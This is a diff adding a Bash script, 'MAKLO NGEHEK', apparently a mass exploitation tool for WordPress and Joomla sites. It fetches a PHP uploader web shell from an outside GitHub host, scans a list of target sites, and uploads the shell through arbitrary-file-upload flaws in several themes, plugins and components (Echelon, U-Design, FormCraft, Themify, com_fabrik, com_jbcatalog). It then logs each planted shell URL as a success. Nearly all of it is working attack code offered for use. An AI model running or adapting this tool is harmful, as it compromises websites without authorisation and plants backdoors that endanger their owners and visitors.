@@ -1,0 +1,252 @@
+#!/bin/bash
+# MAKLO NGEHEK V1.0
+# CODE BY FLORIENZH4X
+# https://github.com/Florienzh4x/MAKLO-NGEHEK/
+
+clear
+############ COLOR #############
+merah='\e[91m'
+cyan='\e[96m'
+kuning='\e[93m'
+oren='\033[0;33m' 
+margenta='\e[95m'
+biru='\e[94m'
+ijo="\e[92m"
+putih="\e[97m"
+normal='\033[0m'
+bold='\e[1m'
+
+#################################
+printf "${bold}"
+Y=$(date +%Y)
+M=$(date +%m)
+shellname="flrnzh.php"
+
+checkdir(){
+	if [[ ! -d Result ]]; then
+		mkdir Result
+	fi
+	if [[ ! -d CMS ]]; then
+		mkdir CMS
+	fi
+	if [[ ! -d VulnWEB ]]; then
+		mkdir VulnWEB
+		mkdir VulnWEB/WordPress
+		mkdir VulnWEB/Joomla
+	fi
+}
+downshell(){
+	if [[ ! -f flrnzh.php ]]; then
+		wget --quiet --no-check-certificate "https://raw.githubusercontent.com/florienzh4x/webshell/master/uploader.php" -O $shellname;
+	fi
+}
+cekupdate(){
+	version="1.0"
+	build="maklo01"
+	LinkUpdate="https://raw.githubusercontent.com/florienzh4x/MAKLO-NGEHEK/master/project"
+	cekupdate=$(curl -s "$LinkUpdate" -L)
+	if [[ $cekupdate == '' ]]; then
+		printf ''
+	else
+		Vers=$(echo $cekupdate | grep -Po '(?<=version:")[^",]*')
+		BUILD=$(echo $cekupdate | grep -Po '(?<=build:")[^",]*')
+		if [[ $version == $Vers || $build == $BUILD ]]; then
+			printf ''
+		else
+			printf "Version $Vers is Avaiable. Updating Script... "
+			mv $0 $0_old; wget --quiet --no-check-certificate "LINK GITHUB" -O $0; chmod +x $0; rm $0_old;
+			printf "[ OK ]\n\n"
+
+		fi
+	fi
+}
+
+header(){
+printf "
+
+${kuning}          MAKLOMAK${ijo}LOMAKLO
+${kuning}       MAKLOMAKLOM${ijo}AKLOMAKLOM
+${kuning}    MAKLOMA  MAKLO${ijo}MAKLO  MAKLOM     ${putih}===========================
+${kuning}  MAKLOMAK    MAKL${ijo}OMAK    MAKLOMA   ${putih}===${ijo}    MAKLO NGEHEK     ${putih}===
+${kuning} MAKLOMAKLO  MAKLO${ijo}MAKLO  MAKLOMAKL  ${putih}===${ijo} Code by Florienzh4x ${putih}===
+${kuning} MAKLOMAKLOMAKLOMA${ijo}KLOMAKLOMAKLOMAK  ${putih}===${ijo}   Copyright © $Y  ${putih}===
+${kuning} MAKLOMAKLOMAKLOMA${ijo}KLOMAKLOMAKLOMAK  ${putih}===========================
+${kuning} MAKLOMAKLOMAKLOMA${ijo}KLOMAKLOMAKLOMAK
+${kuning} MAKLOM    MAKLOMA${ijo}KLOMAK    MAKLOM
+${kuning}  MAKLOMAK        ${ijo}       MAKLOMAK
+${kuning}    MAKLOMAKLOMAKL${ijo}OMAKLOMAKLOMA
+${kuning}       MAKLOMAKLOM${ijo}AKLOMAKLOM
+${kuning}          MAKLOMAK${ijo}LOMAKLO
+${normal}${bold}
+"
+}
+################ WORDPRESS EXPLOIT ########################
+echelon(){
+	printf "    ${cyan}Exploiting Echelon Themes ${putih}... "
+	path="/wp-content/themes/echelon/lib/admin/functions/media-upload.php"
+	echelon=$(curl -s -X POST -F "orange_themes=@${shellname}" "$wpweb/$path" -L -D -)
+	if [[ $echelon =~ $shellname ]]; then
+		checkshell=$(curl -s "$wpweb/wp-content/uploads/$Y/$M/$shellname" -L)
+		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
+			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+			echo "$wpweb/wp-content/uploads/$Y/$M/$shellname" >> Result/WordPress-shell.txt
+		else
+			printf "${putih}[ ${merah}FAILED ${putih}]\n"
+			echo "$wpweb/$path" >> VulnWEB/WordPress/echelon.txt
+		fi
+	else
+		printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+	fi
+}
+u-design(){
+	printf "    ${cyan}Exploiting U-Design ${putih}... "
+	path="/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php"
+	Udesign=$(curl -s -X POST -F "Filedata=@${shellname}" "$wpweb/$path" -L -D -)
+	if [[ $Udesign =~ "200 OK" ]]; then
+		shellpath=$(curl -s "$wpweb/$shellname" -L)
+		if [[ $shellpath =~ "Monkey B Luffy" ]]; then
+			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+			echo "$wpweb/$shellname" >> Result/WordPress-shell.txt
+		else
+			printf "${putih}[ ${merah}FAILED ${putih}]\n"
+			echo "$wpweb/$path" >> VulnWEB/WordPress/u-design.txt
+		fi
+	else
+		printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+	fi
+}
+formcraft(){
+		printf "    ${cyan}Exploiting FormCraft ${putih}... "
+		path="/wp-content/plugins/formcraft/file-upload/server/php/upload.php"
+		exploit=$(curl -s -X POST -F "files[]=@${shellname}" "$wpweb/$path" -L -D -)
+		if [[ $exploit =~ "$shellname" ]]; then
+			local cek=$(echo $exploit | grep -Po '(?<=new_name":")[^"]*')
+			local cekshell=$(curl -s "$wpweb/wp-content/plugins/formcraft/file-upload/server/php/files/$shellname" -L)
+			if [[ $cekshell =~ "Monkey B Luffy" ]]; then
+				printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+				echo "$wpweb/wp-content/plugins/formcraft/file-upload/server/php/files/$shellname" >> Result/WordPress-shell.txt
+			else
+				printf "${putih}[ ${merah}FAILED ${putih}]\n"
+				echo "$wpweb/$path" >> VulnWEB/WordPress/formcraft.txt
+			fi
+		else
+			printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+		fi
+}
+themify(){
+		printf "    ${cyan}Exploiting Themify ${putih}... "
+		cekthemes=$(curl -s "$wpweb" -L)
+		if [[ $cekthemes =~ "/themify/" ]]; then
+			theme=$(echo $cekthemes | grep -Po "(?<=/themes/)[^/]*" | head -1)
+			exploit=$(curl -s "$wpweb/wp-content/themes/$theme/themify/themify-ajax.php?upload=1" -X POST -F "Filedata=@${shellname}" -L -D -)
+			if [[ $exploit =~ $shellname ]]; then
+				cekshell=$(curl -s "$wpweb/wp-content/themes/$theme/uploads/$shellname" -L)
+				if [[ $cekshell =~ "Monkey B Luffy" ]]; then
+					printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+					echo "$wpweb/wp-content/themes/$theme/uploads/$shellname" >> Result/WordPress-shell.txt
+				else
+					printf "${putih}[ ${merah}FAILED ${putih}]\n"
+					echo "$wpweb/wp-content/themes/$theme/themify/themify-ajax.php" >> VulnWEB/WordPress/themify.txt
+				fi
+			else
+				printf "${putih}[ ${merah}FAILED ${putih}]\n"
+				echo "$wpweb/wp-content/themes/$theme/themify/themify-ajax.php" >> VulnWEB/WordPress/themify.txt
+			fi
+		else
+			printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+		fi
+}
+######################### JOOMLA EXPLOITER ##############################
+com_fabrik(){
+	printf "    ${cyan}Exploiting Com_Fabrik ${putih}... "
+	vulnpath="$jomweb/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
+	posting=$(curl -s -X POST -F "file=@${shellname}" "$vulnpath" -L -D -)
+	if [[ $posting =~ "$shellname" ]]; then
+		checkshell=$(curl -s "$jomweb/$shellname" -L)
+		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
+			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+			echo "$jomweb/$shellname" >> Result/Joomla-shell.txt
+		else
+			printf "${putih}[ ${merah}FAILED ${putih}]\n"
+			echo "$vulnpath" >> VulnWEB/Joomla/com_fabrik.txt
+		fi
+	else
+		printf "${putih}[ ${merah}NOT VULN ${putih}]\n"
+	fi
+
+}
+com_jbcatalog(){
+	printf "    ${cyan}Exploiting Com_Jbcatalog ${putih}... "
+	path="$jomweb/components/com_jbcatalog/libraries/jsupload/server/php"
+	post=$(curl -s -X POST -F "files[]=@${shellname}" "$path" -L -D -)
+	if [[ $post =~ $shellname ]]; then
+		shellpath=$(echo $post | grep -Po '(?<="url":")[^",]' | sed 's/\\\//\//g')
+		checkshell=$(curl -s "$path/files/$shellname" -L)
+		if [[ $checkshell =~ "Monkey B Luffy" ]]; then
+			printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+			echo "$path/files/$shellname" >> Result/Joomla-shell.txt
+		else
+			cekshell=$(curl -s "$shellpath" -L)
+			if [[ $cekshell =~ "Monkey B Luffy" ]]; then
+				printf "${putih}[ ${ijo}SUCCESS ${putih}]\n"
+				echo "$shellpath" >> Result/Joomla-shell.txt
+			else
+				printf "${putih}[ ${merah}FAILED ${putih}]\n"
+				echo "$path" >> VulnWEB/Joomla/com_jbcatalog.txt
+			fi
+		fi
+	else
+		printf "${putih}[ ${merah}NOT VULN ${putih}]\n"		
+	fi
+
+}
+########################### EXECUTE BY CMS ###################################
+wordpress(){
+	wpweb="$1"
+	printf "${putih}[${ijo}=${putih}] WordPress ${margenta}=> ${kuning}$wpweb\n"
+	echelon
+	u-design
+	formcraft
+	themify
+}
+joomla(){
+	jomweb="$1"
+	printf "${putih}[${ijo}=${putih}] Joomla ${margenta}=> ${kuning}$jomweb\n"
+	com_fabrik
+	com_jbcatalog
+}
+########################### SCANNING ######################################
+scanning(){
+	sites="$1"
+	checking=$(curl -s --connect-timeout 10 "$sites" -L)
+	if [[ $checking == '' ]]; then
+		printf "${putih}[${merah}!${putih}]${kuning} $sites ${putih}[ ${cyan}No Connection${putih}/${cyan}Site Die ${putih}]\n"
+	elif [[ $checking =~ "wp-content" || $checking =~ "WordPress" || $checking =~ "wordpress" || $checking =~ "wp-includes" ]]; then
+		echo "$sites" >> CMS/WordPress.txt
+		wordpress $sites $shellname
+	elif [[ $checking =~ "Joomla!" || $checking =~ "com_content" || $checking =~ "/components/" ]]; then
+		echo "$sites" >> CMS/Joomla.txt
+		joomla $sites $shellname
+	else
+		echo "$sites" >> CMS/other.txt
+		printf "${putih}[${ijo}=${putih}] Unknown CMS ${margenta}=> ${kuning}$sites\n"
+	fi
+}
+########################### MAIN SCRIPT ###################################
+header
+cekupdate
+downshell
+checkdir
+
+printf "${kuning}List ${putih}: ${cyan}";ls;printf "${putih}"
+read -p "Select Your List: " TargetList;
+printf "\n"
+
+IFS=$'\r\n' GLOBIGNORE='*' command eval 'web=($(cat $TargetList))'
+for (( i = 0; i < "${#web[@]}"; i++ )); do
+	    web="${web[$i]}"
+	scanning $web $shellname
+done
+wait
+
+printf "${normal}"
